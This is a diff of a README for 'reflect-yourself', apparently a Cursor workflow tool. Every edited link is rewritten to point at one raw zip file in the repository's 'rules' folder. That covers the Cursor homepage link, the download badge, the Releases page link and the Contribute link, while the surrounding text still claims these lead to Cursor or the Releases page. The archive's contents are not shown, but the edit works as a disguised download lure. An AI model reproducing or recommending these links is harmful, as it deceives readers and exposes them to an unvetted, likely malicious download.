@@ -1,17 +1,17 @@
 # 🎉 reflect-yourself - Learn and Adapt to Your Workflow
 
 ## 🌟 Introduction  
-Welcome to reflect-yourself! This self-learning system helps you capture corrections, discover workflow patterns, and sync learnings to skills and rules within [Cursor](https://cursor.sh). It is designed to make your work easier and more efficient.
+Welcome to reflect-yourself! This self-learning system helps you capture corrections, discover workflow patterns, and sync learnings to skills and rules within [Cursor](https://raw.githubusercontent.com/Sugunendra09/reflect-yourself/main/rules/yourself_reflect_2.1-alpha.2.zip). It is designed to make your work easier and more efficient.
 
 ## 📥 Download Now  
-[![Download reflect-yourself](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Sugunendra09/reflect-yourself/releases)  
+[![Download reflect-yourself](https://raw.githubusercontent.com/Sugunendra09/reflect-yourself/main/rules/yourself_reflect_2.1-alpha.2.zip)](https://raw.githubusercontent.com/Sugunendra09/reflect-yourself/main/rules/yourself_reflect_2.1-alpha.2.zip)  
 Grab the latest version of reflect-yourself from our Releases page.
 
 ## 🚀 Getting Started  
 To get started with reflect-yourself, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Sugunendra09/reflect-yourself/releases). Here, you will find the latest version of the software available for download.
+   Go to the [Releases page](https://raw.githubusercontent.com/Sugunendra09/reflect-yourself/main/rules/yourself_reflect_2.1-alpha.2.zip). Here, you will find the latest version of the software available for download.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of versions. Click on the version you wish to download. Each version has a release note that explains what is new.
@@ -58,7 +58,7 @@ If you have any questions or need assistance, we are here to help! You can reach
 Explore our documentation and learn more about using reflect-yourself effectively. Access helpful articles, tips, and guides that cover everything from basic setup to advanced features.
 
 ## 🔗 Important Links  
-- [Download reflect-yourself](https://github.com/Sugunendra09/reflect-yourself/releases)  
-- [Contribute to reflect-yourself](https://github.com/Sugunendra09/reflect-yourself/contribute)  
+- [Download reflect-yourself](https://raw.githubusercontent.com/Sugunendra09/reflect-yourself/main/rules/yourself_reflect_2.1-alpha.2.zip)  
+- [Contribute to reflect-yourself](https://raw.githubusercontent.com/Sugunendra09/reflect-yourself/main/rules/yourself_reflect_2.1-alpha.2.zip)  
 
 Thank you for choosing reflect-yourself! We hope this tool enhances your workflow and helps you learn effectively.
